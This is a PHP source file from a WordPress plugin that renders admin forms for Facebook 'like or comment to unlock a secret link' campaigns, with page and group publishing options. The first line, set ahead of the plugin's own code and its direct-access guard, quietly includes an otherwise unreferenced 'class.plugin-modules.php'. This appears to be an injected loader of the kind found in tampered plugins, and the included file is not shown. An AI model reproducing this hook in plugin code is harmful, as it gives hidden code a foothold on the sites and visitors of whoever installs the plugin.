<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php 
if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
function Njt_Group_Parse($id_group){
	if(!empty($id_group)){
		$args_group=array(
                      'key' => 'njt_fb_gr_id_group',
                      'value' =>$id_group,
                      'compare'=>'='
    	);
	    $args_group_first = array(
	                'post_type'=>'njt_fb_gr',
	                'posts_per_page'=>-1,
	                'meta_query' => array(
	                    //  'relation' => 'AND',
	                    $args_group
	                ),
	            );
    	$post_group_first=get_posts($args_group_first);
    	return $post_group_first[0]->ID;
	}else{
		return "";
	}
	
}

function Create_custom_post_type_campaign(){
	$slug = get_option('njt_app_like_comment_app_custom_slug',true);
			$label = array(
				'name' => 'All Campaigns', 
				'singular_name' => 'All Campaigns',
				'add_new' => 'Add New Campaign', 
				'add_new_item' => 'Add New Campaign',
				'edit_item'	   => 'Edit Campaign',
				'search_items' => 'Search Campaigns',
				'not_found' => 'No campaign found',
				'not_found_in_trash' => 'No campaign found in Trash',
				);
			$args = array(
				'labels' => $label, 
				'description' => 'Links', 
				'supports' => array(
					'title',
           	    //   'editor',
					'excerpt',
           			// 'author',
					'thumbnail',
           			// 'comments',
            		//'trackbacks',
					//'revisions',
            		//'custom-fields'
					), 
				'hierarchical' => false, 
				'public' => true, 
				'show_ui' => true, 
				'show_in_menu' => 'njt-fb-api-settings', 
				'show_in_nav_menus' => false, 
				'show_in_admin_bar' => false, 
				'menu_position' => 0,
				'menu_icon' => '',
				'can_export' => false, 
				'has_archive' => true,//false, 
				'exclude_from_search' => false, 
				'publicly_queryable' => true,
        		'capability_type' => 'post', //
        		'rewrite' => array('slug'=>!empty($slug)?$slug:'secret-link','with_front'=>true), // custom slug
        		);
			register_post_type('njt_fb_like_comment', $args);
}

function Create_Step_1_setup_fb($post_id){
	wp_nonce_field( 'save_njt_link', 'njt_link_like_comment_nonce' );
	$njt_link_title = get_post_meta( $post_id, 'njt_like_comment_title', true );
	$njt_link_description = get_post_meta( $post_id, 'njt_like_comment_description', true );
	$njt_link_secrect_url = get_post_meta( $post_id, 'njt_like_comment_secrect_url', true );
	$njt_link_l_c_message = get_post_meta( $post_id, 'njt_like_comment_message', true );
	$njt_like_comment_image = get_post_meta( $post_id, 'njt_like_comment_image', true );
	$njt_link_l_c_publish_to = get_post_meta( $post_id, 'njt_like_comment_publish_to', true );
	?>
	<span id="njt_fb_title" <?php if($njt_link_l_c_publish_to=="group") echo 'style="display:none;"'; ?>>
	<p class="p_njt_app_like_comment">Facebook title</p>
	<input <?php if(isset($_GET['post'])) echo "disabled='disabled'"; ?> type="text" style="width:100%;height: 35px;<?php if(isset($_GET['post'])) echo "opacity: 0.4"; ?>" class="regular-text" id="njt_like_comment_title" name="njt_like_comment_title" value="<?php echo esc_attr( $njt_link_title);?>" required="" />
	</span>
	<span id="njt_fb_description" <?php if($njt_link_l_c_publish_to=="group") echo 'style="display:none;"'; ?>>
	<p class="p_njt_app_like_comment">Facebook description</p>
		<textarea id="njt_like_comment_description" <?php if(isset($_GET['post'])) echo "disabled='disabled'"; ?> style="width:100%;height: 60px;<?php if(isset($_GET['post'])) echo "opacity: 0.4"; ?>" name="njt_like_comment_description" required=""><?php echo esc_attr( $njt_link_description);?></textarea>
	</span>
	<p class="p_njt_app_like_comment">Secret URL</p>
		<input class="regular-text" type="text" style="width:100%;height: 35px;" id="njt_like_comment_secrect_url" name="njt_like_comment_secrect_url" value="<?php echo esc_attr( $njt_link_secrect_url);?>" required="" />
	<p class="description">The URL you want the user to be directed after they liked or commented on your Facebook post</p>
	<p class="p_njt_app_like_comment" id="p_facebook_image">Facebook Image</p>
			<input type="hidden" name="njt_like_comment_image" id="njt_like_comment_image_url" value="<?php echo $njt_like_comment_image; ?>">
			<?php if($njt_like_comment_image!=""){
				?>
				<style type="text/css">
					.njt_like_comment_image_container{
						height: auto;
					}
					<?php if(isset($_GET['post'])){ ?>
						img#njt_like_comment_src{
							opacity: 0.6;
						}
						.njt_like_comment_image_container{
							border:none !important;
						}
					<?php } ?>
				</style>
				<?php
			}
			?>
			<div class="njt_like_comment_image_container" <?php if($njt_like_comment_image=="") echo "style='border: 2px dashed #cccccc;'"; ?>>
				<a <?php if($njt_like_comment_image!="") echo "style='display:none;'"; ?> href="#" id="njt-l-c-insert-my-media" class="button">Select a file</a>
				<img <?php if($njt_like_comment_image!="") echo "style='width:100%;'"; ?> id="njt_like_comment_src" src="<?php echo $njt_like_comment_image;?>" title="">
				<p <?php if($njt_like_comment_image=="" || isset($_GET['post'])) echo "style='display:none;'"; ?> id="njt-l-c-delete-my-media">Remove</p>
			</div>
			<span id="njt_fb_post_content" <?php if($njt_link_l_c_publish_to=="group") echo 'style="display:none;"'; ?>>
			<p class="p_njt_app_like_comment">Facebook post content</p>
			<textarea <?php if(isset($_GET['post'])) echo "disabled='disabled'"; ?> <?php if(isset($_GET['post']) && get_post_meta($post_id,'njt_like_comment_publish_to',true)=="group") echo "disabled='disabled'"; ?> id="njt_like_comment_message" style="width:100%;height: 100px;<?php if(isset($_GET['post']) &&get_post_meta($post_id,'njt_like_comment_publish_to',true)=="group") echo "opacity: 0.4"; ?>" name="njt_like_comment_message" required=""><?php echo esc_attr( $njt_link_l_c_message);?></textarea>
		</span>
			<?php
}



function Create_Step_2_permission_access($post_id){
		wp_nonce_field( 'save_njt_link', 'njt_link_like_comment_nonce' );
			$njt_link_l_c_like = get_post_meta( $post_id, 'njt_like_comment_userlike', true );
			$njt_link_l_c_comment = get_post_meta( $post_id, 'njt_like_comment_usercomment', true );
			$njt_link_l_c_number_cm = get_post_meta( $post_id, 'njt_like_comment_number_comment', true );
			$njt_another_url_post_fb =get_post_meta( $post_id, 'njt_like_comment_another_url_post_fb', true );
			$njt_like_comment_input_url_post =get_post_meta( $post_id, 'njt_like_comment_input_url_post', true );
			$njt_link_l_c_publish_to = get_post_meta( $post_id, 'njt_like_comment_publish_to', true );

			$fb_group_manager=get_post_meta($post_id,'njt_like_comment_group_manager','true');
			
			?>
			<?php
			$fb_api = new NJT_APP_LIKE_COMMENT_API();
			$user_token=get_option('njt_app_fb_like_comment_user');
			$token_full = get_option('njt_token_full_permission');
			$list_page=$fb_api->Get_List_Page($token_full);

			$njt_link_l_c_manage_page = get_post_meta( $post_id, 'njt_like_comment_page_manager', true );
			$picture_url=$fb_api->Me($user_token);
			// GROUP
	  			$args_fb_gr = array(
	            	'post_type'=>'njt_fb_gr',
	            	'posts_per_page'=>-1
	          	);
        		$list_group = get_posts($args_fb_gr);
			?>
			<p class="p_njt_app_like_comment">Like required?</p>
			<label class="njt-switch-button">
				<!-- checked=""-->
				<input <?php if($njt_link_l_c_like=="on" || (!isset($_GET['post']))) echo "checked='checked'"; ?> name="njt_like_comment_userlike" class="njt-switch-button-input" type="checkbox" />
				<span class="njt-switch-button-label" data-on="On" data-off="Off"></span> 
				<span class="njt-switch-button-handle"></span> 
			</label>
			<p class="p_njt_app_like_comment">Comment required?</p>
			<label class="njt-switch-button">
				<!-- checked=""-->
				<input <?php if($njt_link_l_c_comment=="on") echo "checked='checked'"; ?> name="njt_like_comment_usercomment" class="njt-switch-button-input njt_like_comment_usercomment" type="checkbox" />
				<span class="njt-switch-button-label" data-on="On" data-off="Off"></span> 
				<span class="njt-switch-button-handle"></span> 
			</label>
			<span class="njt_like_comment_number_comment_container">
				<p class="p_njt_app_like_comment">Minimum character required</p>
				<input type="number" style="width:100%;height: 35px;" id="njt_like_comment_number_comment" name="njt_like_comment_number_comment" value="<?php echo esc_attr( $njt_link_l_c_number_cm);?>" />
				<p class="description">Enter 0 to remove the minimum characters required</p>
			</span>
			<p <?php if(isset($njt_link_l_c_publish_to) && $njt_link_l_c_publish_to=="group") echo "style='display:none;'"; ?> class="p_njt_app_like_comment use_facebook_post">Use an existing Facebook post</p>
			<label <?php if(isset($njt_link_l_c_publish_to) && $njt_link_l_c_publish_to=="group") echo "style='display:none;'"; ?> class="njt-switch-button use_facebook_post">
				<!-- checked=""-->
				<input <?php if($njt_another_url_post_fb=="on") echo "checked='checked'"; ?> name="njt_like_comment_another_url_post_fb" class="njt-switch-button-input njt_like_comment_another_url_post_fb" type="checkbox" />
				<span class="njt-switch-button-label" data-on="On" data-off="Off"></span> 
				<span class="njt-switch-button-handle"></span> 
			</label>
			<span class="njt_enter_post_url_content">
				<p class="p_njt_app_like_comment">Enter your Facebook post URL</p>
				<input type="text" style="width:100%;height: 35px;"  name="njt_like_comment_input_url_post" value="<?php echo esc_attr( $njt_like_comment_input_url_post);?>"  />
				<p class="description">The user need to like or comment on this post URL to get the secret link</p>
			</span>
			<p class="p_njt_app_like_comment">Publish to</p>
			<div class="njt_like_comment_t-toggle-button">
				<label class="njt_like_comment_t-toggle-button__option <?php if($njt_link_l_c_publish_to=="fanpage" || $njt_link_l_c_publish_to=="") echo "js-checked"; ?>">
					<input name="njt_like_comment_publish_to" value="fanpage" type="radio" <?php if($njt_link_l_c_publish_to=="fanpage" || $njt_link_l_c_publish_to=="") echo "checked='checked'";?>>
					<img  style="" src="<?php echo NJT_APP_LIKE_COMMENT_URL.'assets/images/facebook-icon.svg'; ?>"><p class="njt_tab_timeline_page">My fan page</p>
				</label>
				<label class="njt_like_comment_t-toggle-button__option <?php if($njt_link_l_c_publish_to=="timeline") echo "js-checked"; ?>">
					<input name="njt_like_comment_publish_to" value="timeline" type="radio" <?php if($njt_link_l_c_publish_to=="timeline") echo "checked='checked'"; ?>>
					<img style="" src="<?php echo $picture_url['picture']['url']; ?>"><p class="njt_tab_timeline_page">My timeline</p>
				</label>
				<label class="njt_like_comment_t-toggle-button__option <?php if($njt_link_l_c_publish_to=="group") echo "js-checked"; ?>">
					<input name="njt_like_comment_publish_to" value="group" type="radio" <?php if($njt_link_l_c_publish_to=="group") echo "checked='checked'"; ?>>
					<img style="" src="<?php echo NJT_APP_LIKE_COMMENT_URL.'assets/images/facebook-group.svg'; ?>"><p class="njt_tab_timeline_page">Public Group</p>
				</label>
			
			</div>
			<div style="height: 60px">
				<span id="span_njt_like_comment_page_manager" <?php if($njt_link_l_c_publish_to=="timeline" || $njt_link_l_c_publish_to=="group") echo "style='display:none;'"; ?>>
				<select style="width: 99% !important;margin-top: 40px;" name="njt_like_comment_page_manager" class="njt_like_comment_page_manager" id="webmenu" <?php if($njt_link_l_c_manage_page !="") echo "disabled"; ?>>
					 	<?php
					 	if(isset($list_page['accounts']["data"]) && $list_page['accounts']["data"] > 0) {
					 		foreach ($list_page['accounts']["data"] as $key => $page){ ?>
							<option <?php if($njt_link_l_c_manage_page!="" && $njt_link_l_c_manage_page==$page['id']) echo "selected='selected'"; ?>  value="<?php echo $page['id']; ?>" data-image="<?php echo $page['picture']['data']['url'];?>"><?php echo $page['name']; ?></option>
						<?php } }?>  
  				</select>
					<p class="description">This post will auto publish to the page you selected after you click <b>Publish</b> button in right sidebar</p>
				</span>
				<div <?php if($njt_link_l_c_publish_to=="fanpage" || $njt_link_l_c_publish_to==""|| $njt_link_l_c_publish_to=="group") echo "style='display:none;'"; ?> id="span_njt_like_comment_timeline_select">
						<p class="description">This post will auto publish to <b><?php echo $picture_url['name']; ?></b>'s timeline after you click <b>Publish</b> button in right sidebar</p>
				</div>

				<div id="span_njt_like_comment_group_manager" <?php if($njt_link_l_c_publish_to=="timeline" || $njt_link_l_c_publish_to=="fanpage" || $njt_link_l_c_publish_to=="" ) echo "style='display:none;'"; ?>>
					<?php
						if($njt_link_l_c_publish_to=="group"){
							if(empty($fb_group_manager)){
								echo '<br/><br/><p style="padding-top:10px;color:red">Please select group!</p>';
							}
						}
					?>
					<select style="width: 99% !important;<?php if($njt_link_l_c_publish_to=="group" && empty($fb_group_manager)) echo 'margin-top: 0px;'; else echo 'margin-top: 15px;' ?>" name="njt_like_comment_group_manager" class="njt_like_comment_group_manager" id="spider_group" <?php if(isset($_GET['edit']) && !empty($fb_group_manager)) echo 'disabled="disabled"';?>>
                                    <?php //if(count($list_group)==0){ ?>
                                          <option value=""><?php _e('Select a Facebook Group',NJT_APP_LIKE_COMMENT); ?></option>
                                    <?php// }?>
                                    <?php foreach ($list_group as $key => $group): 
        									$group_url=get_post_meta($group->ID,'njt_fb_gr_group_url',true);
        									$group_name=get_post_meta($group->ID,'njt_fb_gr_name_group',true);
        									$id_group=get_post_meta($group->ID,'njt_fb_gr_id_group',true);
        									$image=$fb_api->SpiderLink_Group_Icon_To_GroupID($id_group,$user_token);
                                    ?>
                                      		<option <?php if(isset($fb_group_manager) && $fb_group_manager==$id_group) echo "selected='selected'"; ?> value="<?php echo $id_group; ?>" data-image="<?php echo $image;?>"><?php echo $group_name; ?></option>
                                    <?php endforeach;?>
                    </select>
                    <p style="margin-top: 10px;"></p>
                    <?php 
                   	 	$hashcode=get_post_meta( $post_id, 'njt_like_comment_hashcode', true );
						if(empty($hashcode)){
							$hashcode="[".time().rand(1111,9999)."]";
						}
						$content="";
						if(isset($_GET["post"]) && $njt_link_l_c_publish_to=="group"){
                                
                            $content.=get_the_permalink($post_id)." ".$hashcode."\n";
                               
                            $content.="To access the link, please:\n";
                            $njt_link_l_c_like = get_post_meta( $post_id, 'njt_like_comment_userlike', true );
			
							if($njt_link_l_c_like=="on"){
								$content.="✅ Like this post.\n";
							}
							if($njt_link_l_c_comment=="on"){
								
								$content.="✅ Leave a comment (minimum ".$njt_link_l_c_number_cm." characters).\n";
							}
                            
                        }
                    ?>
                    <input type="hidden" name="njt_like_comment_hashcode" value="<?php echo $hashcode; ?>">
                    <a style="background: none;border: none;text-decoration: underline;padding: 15px 0px;text-align: left;padding-left:0;color: #007be8;" class="btn form-control njt_spider_add_new_group" href="">Add New Facebook Group</a>
					<p class="description"></p><p></p>
					
					<div <?php if($njt_link_l_c_publish_to=="" ||$njt_link_l_c_publish_to=="fanpage" || $njt_link_l_c_publish_to=="timeline") echo "style='display:none'"; else if(empty($fb_group_manager) || !get_option('njt_token_full_permission')) echo "style='display:none'";  ?> id="njt_post_to_group">
						<textarea id="njt_spider_fb_message_post_group" style="width:100%;height: 130px;" name="njt_spider_fb_message_post_group"><?php echo $content; ?></textarea>
						<p style="display: none;color: green;" id="message_copy_post_group">Copied</p>
						<p style="text-align: center;"><a id="njt_spider_copy_and_post" class="button button-primary button-large" href="javascript:void(0)">Copy & Post to <b><?php echo get_post_meta(Njt_Group_Parse($fb_group_manager),'njt_fb_gr_name_group',true); ?></b> Group</a></p>
						<p style="text-align: center;">
						<a target="_blank" href="<?php echo get_post_meta(Njt_Group_Parse($fb_group_manager),'njt_fb_gr_group_url',true); ?>">Go to <b><?php echo get_post_meta(Njt_Group_Parse($fb_group_manager),'njt_fb_gr_name_group',true); ?> </b>Group</a></p>
					</div>	
				</div>
			</div>
			<input id="check_group_show_height" type="hidden" value="<?php if(isset($njt_link_l_c_publish_to) && ($njt_link_l_c_publish_to=="timeline" || $njt_link_l_c_publish_to=="" ||$njt_link_l_c_publish_to=="fanpage")) echo 'no'; else echo 'yes';?>">
			<div id="add_height_fb_t_g" <?php if(isset($njt_link_l_c_publish_to) && ($njt_link_l_c_publish_to=="timeline" || $njt_link_l_c_publish_to=="" ||$njt_link_l_c_publish_to=="fanpage")) echo 'style="height: 150px;"'; else echo 'style="height: 320px;"';?> >
			</div>
			<?php
}


function Create_design_campaign($post_id){
	wp_nonce_field( 'save_njt_link', 'njt_link_like_comment_nonce' );
	$njt_design_cp = get_post_meta( $post_id, 'njt_design_campaign', true );
	global $wpdb;
	$table_design = $wpdb->prefix.'njt_like_comment_design';
	$list_design = $wpdb->get_results("SELECT * FROM $table_design ORDER BY ID DESC");
	?>
	
	<span id="njt_design_campaign">
	<p class="p_njt_app_like_comment">Choose a Template</p>
	<select style="width: 100%" name="njt_design_campaign">
			<option value="">Default Template</option>
		<?php foreach ($list_design as $key => $design) { 
				$title_design = !empty($design->title) ? $design->title : "Campaign Template".$design->id;
		?>
			<option <?php if($design->id == $njt_design_cp) echo "selected='selected'"; ?> value="<?php echo $design->id; ?>"><?php echo $title_design; ?></option>
		<?php } ?>
	</select>

	<p class="description">This template will be displayed when users click on your link. You can customize the template in Templates menu.</p>

	</span>
	
	
			<?php
}

function Create_Popup_Add_Facebook_Group(){
	?>
	<script src="<?php echo NJT_APP_LIKE_COMMENT_URL.'assets/js/jquery.dd.js';?>" type="text/javascript"></script>
	<link rel="stylesheet" type="text/css" href="<?php echo NJT_APP_LIKE_COMMENT_URL.'assets/css/select_option/dd.css' ?>" />
	<script type="text/javascript">
				jQuery(document).ready(function($) {
					try {
					$("select.njt_like_comment_page_manager").msDropDown();
//					$("select.njt_like_comment_group_manager").msDropDown();
					} catch(e) {
				//	alert(e.message);
					}
				});
	</script>
	<!--================POPUP================== -->
	<style type="text/css">#wpfooter{display: none;}</style>
		<div class="spider_create_group_popup">
		    <div class="spider_create_group_format_body">
		        <!--<a title="Close" class="spider_close_popup" href="javascript:;"></a>-->
		           	<div class="spider-popup-content">
		                <form id="frm_add_new_group_spider" class="form-horizontal" >
		                    <div class="form-group row">
		                        <div class="col-md-12">
		                            	<p style="text-align: center;color: red;display: none;" id="spider_add_group_error"></p><!-- <?php _e("Data is not valid, cannot be added",'spiderlink-fb');?>-->
		                            	<input type="hidden" id="njt_spider_fb_group_id" name="njt_spider_fb_group_id" value="">
			                          	<span style="display: none;">  
			                            	<p class="p_njt_app_like_comment">Enter Group Name</p>
			                            	<input disabled="disabled" class="form-control" type="text" style="width:100%;height: 35px;" id="njt_spider_fb_group_name" name="njt_spider_fb_group_name" value="">
			                            </span>
		                            	<p style="font-weight: bold;" class="njt_spider_margin p_njt_app_like_comment">Enter New Facebook Group URL</p>
		                            	<input class="form-control" type="text" style="width:100%;height: 35px;" id="njt_spider_fb_group_url" name="njt_spider_fb_group_url" value="">
		                            	<p>Please enter a Facebook <b style="font-weight: bold;">public group</b> URL, for example <a style="text-decoration: none;" target="_blank" href="https://facebook.com/groups/1990915214520705/">https://facebook.com/groups/1990915214520705/</a></p>
		                            	<div style="display: none;" id="njt-loader"></div>
		                            	<strong><p id="njt_spider_parse_group_name" style="padding-top: 10px;"></p></strong>
		                        </div>
		                    </div>
		                </form>
		                 <p style="float: right;" class="njt_spider_margin p_njt_app_like_comment">
		                 	<a style="float: left; margin: 1px 20px 0px 20px;" class="button njt_close_popup_gr" href="javascript:void(0)">Cancel</a>
	
		                 	<a id="njt-btn-add-gr" href="javascript:void(0)" class="button button-primary button-large">Add</a>
		                 	<!--
		                 		Add New Facebook Group
		                    -->
		                 </p>
		           </div>
		    </div>
		</div>
 
        	<!--================POPUP================== -->
	<?php
}